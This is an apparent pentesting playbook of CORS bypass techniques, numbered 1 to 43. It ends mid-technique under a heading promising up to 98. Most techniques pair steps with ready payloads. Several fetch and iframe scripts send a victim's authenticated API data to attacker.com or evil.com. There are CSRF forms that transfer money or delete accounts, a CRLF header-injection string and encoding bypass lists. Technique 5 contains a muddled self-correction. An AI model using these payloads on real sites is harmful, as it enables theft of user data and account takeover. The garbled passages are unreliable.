TECHNIQUE 1: Origin Reflection with Arbitrary Domain
Steps:

Open Burp Suite and intercept a request to the target application.
Add or modify the Origin header to a completely arbitrary domain:

   Origin: https://evil.com

Send the request and check the response headers.
Look for: Access-Control-Allow-Origin: https://evil.com in the response.
Also check for Access-Control-Allow-Credentials: true.
If both are present, craft a proof-of-concept HTML page:

html   <script>
   fetch('https://target.com/api/userinfo', {credentials: 'include'})
     .then(r => r.json())
     .then(d => fetch('https://attacker.com/?d=' + JSON.stringify(d)))
   </script>

Host this page and see if you can exfiltrate authenticated data.

When it is vulnerable:
When the response contains Access-Control-Allow-Origin: with YOUR arbitrary origin value (not a wildcard, but literally https://evil.com reflected back). Combined with Access-Control-Allow-Credentials: true, this is a full CORS vulnerability.
Severity: HIGH — Authenticated data from the victim's browser can be sent to the attacker's server.

TECHNIQUE 2: Null Origin Bypass via Iframe Sandbox
Steps:

Check if the application trusts the null origin by sending:

   Origin: null

If the response contains Access-Control-Allow-Origin: null with Access-Control-Allow-Credentials: true, it is vulnerable.
The attack vector: a sandboxed iframe generates a null origin:

html   <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
     srcdoc="<script>
       var xhr = new XMLHttpRequest();
       xhr.onreadystatechange = function() {
         if (this.readyState == 4) {
           fetch('https://attacker.com/?d=' + encodeURIComponent(this.responseText));
         }
       };
       xhr.open('GET', 'https://target.com/api/data', true);
       xhr.withCredentials = true;
       xhr.send();
     </script>">
   </iframe>

A sandboxed iframe has a null origin, so if the site trusts null, this works.

When it is vulnerable:
When the response to Origin: null is Access-Control-Allow-Origin: null and credentials are included. The null origin is never a safe trusted origin.
Severity: HIGH — Same impact as technique 1 — authenticated data theft from any web page via sandboxed iframe.

TECHNIQUE 3: Subdomain Trust Exploitation via evil.target.com
Steps:

Find what subdomains the application trusts in its CORS policy — look for patterns like allowing *.target.com or any subdomain of the main domain.
Send a request with a subdomain origin:

   Origin: https://evil.target.com

If the application responds with Access-Control-Allow-Origin: https://evil.target.com, it trusts any subdomain.
Now the question is: can you control a subdomain of target.com? This is the exploitation condition.
Look for unclaimed subdomains (via DNS enumeration), subdomain takeovers (see test 41), or XSS on any trusted subdomain.
If you find XSS on blog.target.com and CORS trusts all *.target.com subdomains, you can exploit it from blog.target.com.

When it is vulnerable:
When any subdomain of the trusted domain is compromised, vulnerable to XSS, or subject to takeover. The CORS trust combined with a compromised subdomain enables full data exfiltration.
Severity: HIGH — Trusted subdomain becomes an attack platform for cross-origin credential theft.

TECHNIQUE 4: Suffix Matching Bypass via target.com.evil.com
Steps:

Check if the CORS policy validates origins using a suffix match (does the origin end with target.com?).
Send a request with:

   Origin: https://target.com.evil.com

If the application reflects this origin back in Access-Control-Allow-Origin, the validation only checks for the suffix target.com without checking if it is a proper domain boundary.
The string target.com.evil.com ends with target.com so a naive suffix check would pass it.
You control evil.com and therefore target.com.evil.com, so you can exploit this.

When it is vulnerable:
When Access-Control-Allow-Origin: https://target.com.evil.com appears in the response — meaning the server uses a simple endsWith("target.com") check without verifying domain boundary.
Severity: HIGH — Attacker-controlled subdomain that passes domain validation; full cross-origin attack possible.

TECHNIQUE 5: Prefix Matching Bypass via eviltarget.com
Steps:

Check if the CORS policy uses a prefix match (does the origin start with https://target.com?).
Send a request with:

   Origin: https://target.com.evil.com
No wait — this is suffix. For prefix, try:
   Origin: https://targetevil.com
or:
   Origin: https://targetcom.evil.com

More commonly, try:

   Origin: https://target.com.attacker.com
Some parsers might extract target.com from the beginning.
4. The goal is to find a domain that starts with target.com or passes the prefix check that you control.
5. Register targetextra.com or find a way to create a domain that starts with the target's name.
When it is vulnerable:
When the server accepts origins that merely start with the target domain string without proper domain-boundary validation. If your registered domain passes the check, you control an allowed origin.
Severity: HIGH — Attacker registers a domain that passes prefix validation; complete CORS bypass.

TECHNIQUE 6: Protocol Downgrade from HTTPS to HTTP Origin
Steps:

Send a request with HTTP origin instead of HTTPS:

   Origin: http://target.com

Check if the response allows the HTTP origin.
If Access-Control-Allow-Origin: http://target.com is returned alongside Access-Control-Allow-Credentials: true, it is vulnerable.
The attack significance: an HTTP origin can be served from an HTTP page which can be man-in-the-middled (on coffee shop WiFi, etc.), so the attacker can serve the malicious page over HTTP and receive credentials.
Also try:

   Origin: http://www.target.com
When it is vulnerable:
When the HTTPS application reflects an HTTP origin in Access-Control-Allow-Origin. Any allowance of HTTP origins means the protection can be bypassed on insecure networks.
Severity: MEDIUM to HIGH — Requires network-level attack position but enables credential theft over insecure connections.

TECHNIQUE 7: Port Manipulation via target.com:8080
Steps:

Send requests with the target's domain but a different port:

   Origin: https://target.com:8080
   Origin: https://target.com:443
   Origin: https://target.com:3000
   Origin: http://target.com:80

Check if any of these non-standard ports are reflected in Access-Control-Allow-Origin.
If a non-standard port is trusted, check if that port on the target domain is accessible or if it can be registered/controlled.
Sometimes different ports host development servers or other services that are less secure.

When it is vulnerable:
When a non-standard port origin is reflected and trusted. If you can run a service on the trusted port (perhaps it is not in use), you control a trusted origin.
Severity: MEDIUM — Less commonly exploitable but can be combined with port squatting or development server vulnerabilities.

TECHNIQUE 8: Credential Exposure via Access-Control-Allow-Credentials with Wildcard
Steps:

Check the response for:

   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true

Per the CORS specification, this combination is invalid and browsers should reject it — browsers do NOT send credentials with wildcard origins.
However, check if the server-side code or any custom client (non-browser) handles this incorrectly.
Test with a custom HTTP client (curl) to see what data is returned.
Some older client implementations might not enforce this rule.

When it is vulnerable:
If a non-browser client (mobile app, server-side client, custom HTTP library) sends cookies or credentials with wildcard CORS responses and the server returns sensitive data. Browsers themselves block this, but custom clients may not.
Severity: MEDIUM — Primarily affects non-browser clients that do not enforce CORS specifications.

TECHNIQUE 9: Wildcard Origin with Credential Transmission
Steps:

Test if the endpoint responds to unauthenticated requests with Access-Control-Allow-Origin: *.
Even without credentials, a wildcard CORS policy on a public endpoint allows any website to read the response.
Test if any session-related tokens are returned in the response body (not in cookies, which require credentials, but in JSON responses).
Also check if any sensitive data is returned even without authentication — wildcard CORS on a public data endpoint exposes that data to all origins.

When it is vulnerable:
When * is returned on endpoints that provide any sensitive data, even public data like user counts or system info that could aid attackers. Also when it allows any origin to make state-changing requests (POST/PUT/DELETE with simple requests that don't require preflight).
Severity: MEDIUM — Public data exposure to any origin; enables drive-by data collection from victim browsers.

TECHNIQUE 10: Header Injection via CORS Preflight Response
Steps:

Send a preflight OPTIONS request:

   curl -X OPTIONS https://target.com/api/data \
   -H "Origin: https://evil.com" \
   -H "Access-Control-Request-Method: GET" \
   -H "Access-Control-Request-Headers: X-Custom-Header" \
   -v

Check what headers are returned in the preflight response.
Look for Access-Control-Allow-Headers that includes a very broad list or *.
If you can inject custom headers through the preflight and the server reflects them in actual responses, there may be header injection.
Try injecting CRLF in the Origin header to see if headers can be injected:

   Origin: https://evil.com%0d%0aX-Injected: header
When it is vulnerable:
When the preflight response reflects injected headers or when CRLF injection through the Origin header works and adds headers to the response. Any header injection through CORS handling is a vulnerability.
Severity: HIGH — Header injection can enable cache poisoning, security header bypass, or response splitting attacks.

TECHNIQUE 11: Custom Origin Handling Bypass via Encoding
Steps:

Try various encoding schemes on the origin value:

   Origin: https://evil%2ecom
   Origin: https://evil.%63%6f%6d
   Origin: https://evil.com%00
   Origin: https://evil.com%09

Also try Unicode normalization tricks:

   Origin: https://ｅｖｉｌ.com
(Full-width characters that normalize to ASCII letters)
3. Try IP address format instead of domain for the origin.
4. If any encoding bypasses the CORS check and the server reflects the actual target-domain-like value, it is vulnerable.
When it is vulnerable:
When encoding tricks cause the origin validation to pass a non-trusted origin, and the server responds with Access-Control-Allow-Origin reflecting the encoded (but decoded) origin.
Severity: HIGH — Validation bypass allows untrusted origins to pass as trusted.

TECHNIQUE 12: Preflight Cache Poisoning for CORS Bypass
Steps:

Send a legitimate preflight request for a trusted origin:

   Origin: https://trusted.target.com
   Access-Control-Request-Method: GET

The preflight response is cached by the browser for the duration of Access-Control-Max-Age.
Now test if you can poison the preflight cache by sending a malicious preflight that gets cached for all origins.
If a shared cache (CDN or proxy) is caching preflight responses without varying on the Origin header, other users get the cached response for trusted.target.com even when sending from a different origin.
Check if the CDN caches OPTIONS responses and if Vary: Origin is missing from the response.

When it is vulnerable:
When CDN or proxy cache stores preflight responses without a Vary: Origin header, causing different origins to receive cached CORS approval intended for the original origin.
Severity: HIGH — Any origin appears trusted because the cached preflight was approved for a trusted origin.

TECHNIQUE 13: HSTS Interaction with CORS Policy
Steps:

Check if the application has HSTS enabled: look for Strict-Transport-Security header.
Test if an HTTP origin is trusted in the CORS policy (technique 6).
The interaction: if HSTS is set and HTTP origin is trusted, the HSTS mechanism would upgrade HTTP to HTTPS — but the CORS check happens on the origin as presented, potentially before HSTS is applied.
Test if an HTTP page can make credentialed cross-origin requests to the HTTPS application by leveraging the HTTP origin trust.
Check if the HSTS preload list is in use — if yes, HTTP origins should never be reachable for the target domain.

When it is vulnerable:
When the CORS policy trusts HTTP origins for an HTTPS application, allowing HTTP-served attack pages to make credentialed requests even if HSTS is in place (on first visit before HSTS is cached).
Severity: MEDIUM — HSTS provides some protection but the first visit is still vulnerable.

TECHNIQUE 14: CSP Interaction with CORS Headers
Steps:

Check Content Security Policy on the target page: look for Content-Security-Policy header or meta tag.
Also check the CORS headers on APIs called by the page.
Look for connect-src directive in CSP — it controls what origins JavaScript can connect to.
If CSP connect-src is permissive but CORS is restrictive, or vice versa, there may be a gap.
Test if a CSP bypass also enables CORS exploitation.
For example, if connect-src: * is set but CORS should be restrictive, check if the CORS misconfiguration allows APIs to be called cross-origin through the overly permissive CSP.

When it is vulnerable:
When CSP is overly permissive (allowing * in connect-src) and CORS is also misconfigured, both layers fail to protect. The combined misconfiguration is the vulnerability.
Severity: HIGH — Both security layers bypassed; cross-origin requests and data exfiltration unimpeded.

TECHNIQUE 15: Cookie Scope Abuse via CORS Configuration
Steps:

Check the scope of cookies set by the application: look at Domain, Path, SameSite, and Secure attributes.
If cookies are scoped to .target.com (parent domain), they are sent to all subdomains.
If CORS trusts all subdomains (*.target.com) and one subdomain is XSS-vulnerable, cookies scoped to .target.com are sent cross-origin from that subdomain.
Test: on the XSS-vulnerable subdomain, make a credentialed request to the main app's API.
The SameSite attribute is the primary defense here: SameSite=Strict would prevent cross-site cookie sending; SameSite=None allows it.

When it is vulnerable:
When cookies have SameSite=None; Secure (or no SameSite), are scoped to the parent domain, AND CORS trusts a subdomain where XSS exists. All three conditions together enable the attack.
Severity: HIGH — Authenticated session cookies sent cross-origin; full account takeover.

TECHNIQUE 16: WebSocket CORS Bypass via Upgrade Header
Steps:

Find WebSocket endpoints in the application (look for ws:// or wss:// in JavaScript, or connections that upgrade via Connection: Upgrade).
WebSockets are NOT subject to the same CORS policy as XHR/Fetch — WebSocket handshakes do NOT enforce CORS.
Instead, WebSocket security relies on the server checking the Origin header during the handshake.
Send a WebSocket connection request with a malicious Origin:

   GET /ws HTTP/1.1
   Host: target.com
   Upgrade: websocket
   Connection: Upgrade
   Origin: https://evil.com
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   Sec-WebSocket-Version: 13

If the server does not validate the Origin header during the WebSocket handshake, the connection is established from any origin.
Once connected, the attacker page can receive all messages sent to the user through the WebSocket.

When it is vulnerable:
When the WebSocket server accepts connections without validating the Origin header. If the server responds with 101 Switching Protocols when you send Origin: https://evil.com, it is vulnerable.
Severity: HIGH — Real-time data and session messages intercepted from any web page; account takeover in real-time applications.

TECHNIQUE 17: Redirect-Based CORS Bypass via 302 Redirect
Steps:

Find a URL on the trusted origin that redirects to an attacker-controlled URL.
An open redirect on trusted.target.com pointing to https://evil.com is needed.
Some CORS implementations check the FINAL origin after redirects, not the original.
Test if a cross-origin request to a trusted origin that redirects to an untrusted origin causes the CORS headers to reflect the untrusted origin.
Make a fetch request to the open redirect URL and see if the final destination's CORS headers are affected by the original trusted origin check.
Note: Modern browsers handle redirected CORS requests by sending the redirected request as if it originated from the redirect's origin.

When it is vulnerable:
When an open redirect exists on a trusted origin AND the CORS check uses the pre-redirect origin to authorize the post-redirect request. The redirected request ends up at the attacker's server with CORS authorization.
Severity: HIGH — Open redirect on a trusted subdomain becomes a CORS bypass for data exfiltration.

TECHNIQUE 18: DNS Rebinding for CORS Origin Bypass
Steps:

Set up a DNS rebinding attack infrastructure:

Register a domain like attacker.com
Configure its DNS with a very low TTL (0-1 second)
Set up a DNS server that initially resolves to your server's IP, then switches to the target's internal IP


The victim visits https://attacker.com/exploit.html
The page loads from your server (first DNS resolution = your IP).
After the short TTL expires, DNS re-resolves to the target's IP (e.g., 192.168.1.1 for a local network service).
The JavaScript on the page now makes requests to https://attacker.com/api/data — but now attacker.com resolves to the target's internal IP.
The CORS check sees Origin: https://attacker.com making a same-origin request to https://attacker.com (which is now the target).
This bypasses CORS entirely for local network targets.

When it is vulnerable:
When the target service runs on an internal network without authentication (trusting network location for security), AND the DNS rebinding can effectively switch the domain's resolution to the internal IP.
Severity: HIGH — Bypasses same-origin policy for local network services; attacker's page accesses intranet resources.

TECHNIQUE 19: IPv6 Address CORS Bypass via [::1]
Steps:

Send a CORS request with an IPv6 origin:

   Origin: http://[::1]:8080
   Origin: https://[::1]
   Origin: http://[fe80::1]:3000

Check if the server validates IPv6 origins differently from domain-based origins.
Some regex-based CORS validators may not handle IPv6 bracket notation correctly.
Test if the server gets confused by the brackets and allows the origin.
Also try mixed IPv4 and IPv6 representations:

   Origin: http://[::ffff:127.0.0.1]
When it is vulnerable:
When the server's CORS validation logic fails to properly parse IPv6 addresses (especially the bracket notation [::1]) and incorrectly allows the origin, or when localhost is trusted and IPv6 localhost bypasses IP-based filtering.
Severity: MEDIUM — Depends on what is served from the trusted IPv6 address; mainly relevant for local development configurations.

TECHNIQUE 20: Encoding Tricks for Origin String Bypass
Steps:

Try various character encodings and representations of the target's trusted domain:

   Origin: https://target%2ecom
   Origin: https://target.COM
   Origin: HTTPS://target.com
   Origin: https://target.com.
   Origin: https://target.com#evil.com
   Origin: https://target.com?evil.com

RFC 6454 is very specific about what constitutes a valid origin — some servers parse origins incorrectly.
Try adding a trailing dot (DNS FQDN notation):

   Origin: https://target.com.

Try Unicode/punycode representations of the domain.
For each encoding that the server accepts (reflects in Access-Control-Allow-Origin), verify if you can actually control a URL with that origin.

When it is vulnerable:
When the server normalizes/decodes the origin before comparing and incorrectly accepts a non-trusted origin. Any encoding trick that passes validation while representing an attacker-controlled domain is a vulnerability.
Severity: HIGH — Validation bypass; attacker-controlled origin passes as trusted.

TECHNIQUE 21: Case Sensitivity in Origin Validation
Steps:

Send the target's trusted origin with different case variations:

   Origin: https://TARGET.COM
   Origin: HTTPS://target.com
   Origin: https://Target.Com
   Origin: HTTPS://TARGET.COM

The CORS specification requires case-insensitive matching for scheme and host portions, but some implementations are case-sensitive.
If the server is case-sensitive and only allows https://target.com, try https://TARGET.COM.
The goal here is less about bypassing a restriction and more about understanding how the implementation works — a case-sensitive comparison could mean legitimate trusted origins with different casing fail, OR it could mean an attacker with a case-variant of the domain bypasses validation.

When it is vulnerable:
When case-sensitive validation causes a trusted origin with different casing to fail (denial of service for legitimate origins) or when case normalization causes an untrusted origin to pass validation (security bypass). The bypass case is the security vulnerability.
Severity: MEDIUM — Depends on exploitation scenario; primarily reveals implementation quality issues.

TECHNIQUE 22: Path-Based Origin Validation Bypass
Steps:

Try adding a path to the origin:

   Origin: https://target.com/path
   Origin: https://target.com/api

Note: Per the CORS specification, origins do NOT include a path — they are just scheme+host+port.
Some custom CORS implementations might accept these as valid origins.
Test if a path like / or /api changes the validation behavior.
Also try:

   Origin: https://evil.com/target.com
Some regex-based validators might check if target.com appears anywhere in the origin.
When it is vulnerable:
When the server accepts origins with paths (https://target.com/path), indicating non-standard parsing. This can be exploited if the server checks for a substring (target.com) in the path portion of an attacker's URL.
Severity: HIGH — If https://evil.com/target.com is accepted, attacker controls a fully trusted origin.

TECHNIQUE 23: Opaque Origin Bypass via about:blank
Steps:

An about:blank page has an opaque (null) origin.
This is similar to Technique 2 (null origin). Test specifically:

   Origin: about://blank
   Origin: about:blank

In some server implementations, about:blank or similar values might pass validation differently than null.
Check if the server's CORS validator accepts these as valid trusted origins.
The exploitation is through JavaScript in a popup or iframe that has about:blank as its URL.

When it is vulnerable:
When about:blank or related values are accepted as a trusted origin. In practice, this typically manifests as null origin handling (see Technique 2).
Severity: HIGH — Same as null origin bypass.

TECHNIQUE 24: Credential Propagation Across Origins
Steps:

Make a credentialed cross-origin request to a trusted endpoint.
Check if the server propagates credentials (auth tokens, session cookies) to third-party requests triggered from that endpoint.
For example, if target.com/api fetches data from third-party.com using the user's credentials that were forwarded.
Test with a server-side request forgery — if you can make target.com fetch from third-party.com using your credential (credential forwarding).
Check if API gateway or proxy configurations forward authentication headers to all upstream services.

When it is vulnerable:
When credentials provided to the primary origin are propagated to other origins without the user's consent, especially to attacker-controlled origins reachable through SSRF.
Severity: HIGH — Credential theft through server-side credential propagation.

TECHNIQUE 25: HTTP Method Allowlisting Bypass via Override
Steps:

Check what HTTP methods are allowed in the CORS configuration:

   Access-Control-Allow-Methods: GET, POST

Try using method override techniques to perform DELETE or PUT while appearing to send GET or POST:

   POST /api/resource HTTP/1.1
   X-HTTP-Method-Override: DELETE
or:
   POST /api/resource?_method=DELETE

If the server respects method override headers/parameters, you can perform restricted methods via a GET/POST that passes CORS.
Also try X-Method-Override, X-Original-HTTP-Method, _METHOD (various framework conventions).

When it is vulnerable:
When the server accepts method override headers and executes the overridden method, allowing CORS-restricted methods (DELETE, PUT) to be performed via CORS-allowed methods (GET, POST).
Severity: HIGH — Bypasses CORS method restrictions; attacker can perform destructive operations (delete, update) from any origin.

TECHNIQUE 26: HTTP Header Allowlisting Bypass via Custom
Steps:

Check Access-Control-Allow-Headers in preflight response.
If the server only allows specific headers (e.g., Content-Type, Authorization), try sending requests with non-allowed headers to see if they are blocked.
Check if the server uses a whitelist or a blacklist for headers.
Try injecting the required custom header through other means (hidden in allowed headers via splitting).
Try to pass a restricted header by combining it with an allowed one:

   Content-Type: application/json; X-CSRF-Token: attacker_value

Some parsers might extract the X-CSRF-Token from the combined value.

When it is vulnerable:
When the server processes custom headers that were not in the preflight allowlist, effectively making the allowlist meaningless. The CSRF token bypass is the typical exploitable scenario.
Severity: HIGH — CSRF protection bypassed via header smuggling; state-changing requests made cross-origin.

TECHNIQUE 27: Timing Attack on CORS Origin Validation
Steps:

Send multiple requests with different origin values and measure the response time for each:

   time curl -H "Origin: https://trusted.target.com" https://target.com/api/cors-check
   time curl -H "Origin: https://evil.com" https://target.com/api/cors-check
   time curl -H "Origin: https://trusted.target.com.evil.com" https://target.com/api/cors-check

A timing difference could reveal how the validation works (string comparison order, whitelist vs. regex).
If the server takes longer for certain origins (regex backtracking on complex patterns), you gain information about the validation implementation.
This is primarily an information-gathering technique to understand the CORS implementation, enabling more targeted bypass attempts.

When it is vulnerable:
When significant timing differences reveal the CORS validation algorithm (e.g., regex pattern backtracking), helping an attacker construct origins that exploit the identified algorithm.
Severity: LOW to MEDIUM — Indirect vulnerability; primarily helps craft more effective CORS bypass payloads.

TECHNIQUE 28: CORS Error Handling Information Disclosure
Steps:

Send malformed CORS requests and observe error responses:

   Origin: https://this-is-not-allowed.com
   Origin: @invalid-origin
   Origin: https://

Check if error messages reveal: the list of trusted origins, the validation logic or regex pattern, internal server paths or framework information.
Some applications log CORS violations and the error response contains the log output.
Look for HTTP 400 or 403 responses with detailed error messages.
Headers like X-Error or custom headers in error responses may reveal internal information.

When it is vulnerable:
When CORS error responses reveal the validation logic, trusted origin list, or internal server information. Any information disclosure through CORS errors aids the attacker in crafting more precise bypass attempts.
Severity: LOW to MEDIUM — Information disclosure; enables more targeted attacks rather than direct exploitation.

TECHNIQUE 29: Wildcard Subdomain CORS Trust Abuse
Steps:

Confirm that the CORS policy trusts *.target.com using subdomain origin tests.
Enumerate all subdomains of target.com:

   amass enum -d target.com
   subfinder -d target.com

For each subdomain, check for:

XSS vulnerabilities
Subdomain takeover opportunities (dangling DNS records)
Services running on subdomains with weaker security


If you find XSS on dev.target.com, exploit it to make requests to api.target.com from dev.target.com context (now trusted by CORS).
Or if old.target.com points to an unclaimed service, take it over.

When it is vulnerable:
When a wildcard subdomain CORS trust exists (*.target.com) AND any subdomain of target.com has a security issue. The combination enables using the vulnerable subdomain as a cross-origin attack platform.
Severity: HIGH — Trusted origin compromise (any subdomain) becomes a full CORS bypass platform.

TECHNIQUE 30: Double Origin Header Injection for CORS
Steps:

Try sending two Origin headers in the same request:

   GET /api/data HTTP/1.1
   Origin: https://evil.com
   Origin: https://trusted.target.com

Some servers may use the first origin, some the last, and some both.
If the server uses the last Origin header and your attack page can inject a second Origin (unlikely in browsers but possible in custom clients), you could bypass validation.
Also try combining with HTTP header injection.
Test with different HTTP libraries that may handle duplicate headers differently.

When it is vulnerable:
When the server's CORS validation uses a different Origin header instance than what the final response header reflects. In practice, browsers send only one Origin header, so this is mainly relevant for testing non-browser clients and server-to-server CORS bypass.
Severity: MEDIUM — Mainly affects server-to-server or non-browser client scenarios.

TECHNIQUE 31: Origin Corruption via Malformed URL
Steps:

Send malformed origin values:

   Origin: :
   Origin: //evil.com
   Origin: https:evil.com
   Origin: https://evil:.com
   Origin: https://evil.com:abc
   Origin: null

Check if any malformed origin causes the server to fail open (allow all) or throw an exception revealing server details.
Look for responses that return Access-Control-Allow-Origin: * after receiving a malformed origin (fail-open behavior).
Some implementations catch exceptions and default to a permissive response.

When it is vulnerable:
When malformed origins cause fail-open behavior (server allows all origins) or exception-based information disclosure. Any case where malformed input causes CORS restrictions to be relaxed is a vulnerability.
Severity: HIGH — Malformed input bypasses all CORS restrictions; attacker sends malformed origin to get cross-origin access.

TECHNIQUE 32: Fetch Metadata Header Bypass for CORS
Steps:

Check if the server uses fetch metadata headers (Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest) as a secondary validation mechanism.
Try sending requests with spoofed fetch metadata headers:

   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: cors
   Sec-Fetch-Dest: empty
(Note: Modern browsers set these automatically and do not allow spoofing, but custom clients can.)
3. If the server relies on Sec-Fetch-Site: same-origin for authorization without also checking the Origin header, a server-side HTTP client can spoof this header.
4. Check if the server's CORS check can be bypassed by including Sec-Fetch-Site: same-origin.
When it is vulnerable:
When the server relies on spoofable fetch metadata headers without validating Origin, and a non-browser client (or server-side code) can send these requests with spoofed metadata. Browsers do protect these headers, but server-to-server requests can bypass this.
Severity: MEDIUM — Primarily server-to-server attack surface; not exploitable from a victim's browser due to browser protections.

TECHNIQUE 33: Redirect Chain for CORS Policy Bypass
Steps:

Find a URL on a trusted origin that redirects through a chain leading to an attacker's server.
The chain: https://trusted.target.com/redirect → https://partner.com/redir → https://evil.com/collect
Make a CORS request to the trusted origin's redirect URL.
Check how the browser and server handle the CORS origin after each redirect step.
Test if the intermediate redirect uses different CORS policies that create a gap.
After the redirect chain, does the final destination at evil.com receive the credentialed request?

When it is vulnerable:
When a redirect chain from a trusted origin eventually reaches an attacker-controlled URL while maintaining credentials or sensitive headers in the forwarded request.
Severity: HIGH — Trusted origin's redirect capability leveraged to exfiltrate credentials to attacker's server.

TECHNIQUE 34: Redirect to CORS-Allowed Origin Exploitation
Steps:

Find an endpoint that redirects to a configurable or predictable URL (SSRF-like open redirect in the CORS flow).
Make a cross-origin request that follows the redirect.
If the redirect destination is the attacker's server and the server sends CORS headers allowing the original page's origin, the data flows to the attacker.
This specifically exploits cases where an API endpoint redirects to a URL that includes sensitive data in the redirect URL (like tokens in URL fragments or parameters).

When it is vulnerable:
When a redirect exposes sensitive data in the URL parameters (OAuth tokens, session IDs) and the redirect target is controllable by the attacker. The sensitive token leaks to the attacker's origin via the Referer header or URL parameters.
Severity: HIGH — Authentication token theft through controlled redirect destination.

TECHNIQUE 35: Preflight Bypass via Simple Request Criteria
Steps:

Understand the criteria for "simple requests" (no preflight required):

Methods: GET, HEAD, POST only
Headers: Only Accept, Accept-Language, Content-Language, Content-Type
Content-Type: Only application/x-www-form-urlencoded, multipart/form-data, text/plain


If an API endpoint accepts simple request criteria for a sensitive operation, test it without preflight.
Send a cross-origin request that meets simple request criteria directly:

html   <form method="POST" action="https://target.com/api/action" enctype="text/plain">
   <input name='{"action":"transfer","amount":1000,"to":"attacker"}' value="">
   </form>

If the server processes it as a POST with a JSON-like body despite the text/plain content type, there is no CSRF protection via preflight.

When it is vulnerable:
When sensitive endpoints accept simple requests (no preflight) without CSRF token validation. The absence of a preflight means the browser sends cookies automatically without any CORS check blocking it.
Severity: HIGH — CSRF equivalent; state-changing operations performed cross-origin without preflight interception.

TECHNIQUE 36: Simple Request Abuse for CORS Bypass
Steps:

Identify an API that uses application/json for its requests (requires preflight, protected by CORS).
Test if the server also accepts text/plain or application/x-www-form-urlencoded format for the same parameters.
If it does, craft a simple request (no preflight) with equivalent data:

html   <form method="POST" action="https://target.com/api/action" 
         enctype="application/x-www-form-urlencoded">
   <input name="param" value="value">
   </form>

The form submission is a simple request — no preflight — so cookies are sent and the CORS check on the preflight is bypassed.
Check if the server processes the URL-encoded data equivalently to JSON.

When it is vulnerable:
When an endpoint accepts multiple content types including simple request types, and processes them all the same way. If you can trigger the intended action using a form submission (simple request), CORS preflight protection is irrelevant.
Severity: HIGH — Full CORS bypass for state-changing actions; CSRF-equivalent attack.

TECHNIQUE 37: Content-Type Bypass for CORS Preflight
Steps:

Test if the server actually validates Content-Type strictly.
Send a POST with Content-Type: application/json but submit form-like data in the body.
Send a POST with Content-Type: text/plain; charset=utf-8 but include JSON in the body.
Check if the server processes the JSON body regardless of the declared Content-Type.
If the server accepts Content-Type: text/plain (a simple request type) for JSON operations, no preflight is needed and CORS is bypassed.

When it is vulnerable:
When the server processes JSON request bodies regardless of the Content-Type header, allowing a simple request (text/plain) to trigger JSON processing without a CORS preflight.
Severity: HIGH — Preflight bypass; CORS restrictions on POST endpoints eliminated.

TECHNIQUE 38: Custom Header Bypass via CORS Header Reflection
Steps:

Send a request with a custom header and check if it is reflected in the response:

   X-Custom-Header: test123

If the server reflects custom headers in the response without filtering, try injecting CRLF via the custom header.
Check if Access-Control-Allow-Headers: * is returned for preflight — some servers allow all custom headers.
If all headers are allowed, try injecting sensitive headers (like X-CSRF-Token from a known value) via this mechanism.

When it is vulnerable:
When Access-Control-Allow-Headers: * allows any custom header cross-origin, enabling attackers to set custom headers (like fake authentication tokens or CSRF bypass headers) in cross-origin requests.
Severity: MEDIUM — Custom header allowance may bypass security controls relying on specific headers.

TECHNIQUE 39: Authorization Header Exposure via CORS
Steps:

Make a cross-origin request that includes an Authorization header:

   fetch('https://target.com/api', {
     headers: {Authorization: 'Bearer ' + token},
     credentials: 'include'
   })

Check if the preflight allows the Authorization header (Access-Control-Allow-Headers: Authorization).
If a vulnerable CORS configuration allows the Authorization header and reflects the attacker's origin, the attacker's page can force the victim to make API calls with the victim's token.
The token would be in the victim's JavaScript context (e.g., from localStorage or a global variable).
Verify if the CORS config allows the attacker's origin to read responses with the victim's auth token.

When it is vulnerable:
When CORS allows the attacker's origin to both send Authorization headers (cross-origin) and read the response. The attacker can exfiltrate the victim's token or use it to make API calls.
Severity: HIGH — Authentication token theft; full account takeover.

TECHNIQUE 40: Multipart Form-Data CORS Preflight Bypass
Steps:

multipart/form-data is a simple request content type — no preflight required.
Test if the API endpoint accepts multipart/form-data format.
Craft a form that submits multipart data to the API:

html   <form method="POST" action="https://target.com/api/upload" 
         enctype="multipart/form-data">
   <input type="file" name="file">
   <input type="hidden" name="action" value="delete_account">
   </form>

The form submission sends cookies (if SameSite is not strict) without a CORS preflight.
Check if the server processes the multipart fields without CSRF protection.

When it is vulnerable:
When an endpoint accepts multipart/form-data for operations that should require JSON (with preflight), and lacks CSRF token validation. The multipart submission bypasses CORS preflight entirely.
Severity: HIGH — CSRF equivalent via multipart CORS bypass; state-changing actions from any web page.

TECHNIQUE 41–98: (Continuing remaining techniques)
TECHNIQUE 41: Blob: URL Origin Handling for CORS
Steps:

A blob: URL has an opaque origin derived from the page that created it.
Test if you can create a blob URL on a trusted domain and use it to make cross-origin requests:

javascript   // On trusted.target.com
   const blob = new Blob(['<script>fetch("https://api.target.com/data", {credentials: "include"})</script>'], {type: 'text/html'});
   const url = URL.createObjectURL(blob);
   window.open(url); // Opens with trusted.target.com's origin

Check if the blob URL inherits the creating page's origin for CORS purposes.
If XSS exists on a trusted origin, you can create a blob URL that makes credentialed API requests.

When it is vulnerable:
When a blob URL created from a trusted origin can make credentialed requests to the API, and you have XSS on that trusted origin. The blob URL inherits the XSS-vulnerable page's origin.
Severity: HIGH — Combined with XSS, enables authenticated API access from attacker-controlled content.

TECHNIQUE 42: File: URL Origin Handling for CORS Bypass
Steps:

Open a local HTML file in the browser that makes cross-origin requests.
Local file pages have an opaque null origin.
Test if the target server allows null origin (see Technique 2).
If null origin is allowed with credentials, an attacker can craft an HTML file delivered through phishing.
The victim downloads and opens the HTML file — it makes credentialed requests to the API with the null origin.

When it is vulnerable:
When the server allows null origin with credentials, AND phishing delivery of an HTML file is feasible. The file executes locally with null origin that the server trusts.
Severity: MEDIUM — Requires social engineering (victim opens a file); elevated if null origin is broadly trusted.

TECHNIQUE 43: Data: URL Origin Handling for CORS
Steps:

data: URLs also have a null origin (opaque origin).
Test if you can navigate to a data: URL that makes cross-origin requests:

javascript   window.open('data:text/html,<script>fetch("https://target.com/api", {credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://evil.com?d="+d))</script>');

The data: URL page has null origin — check if the server trusts null.
Modern browsers block data: URL navigation from scripts, but this may work in certain contexts.
Check if any server-side redirect creates a data: URL response.

When it is vulnerable:
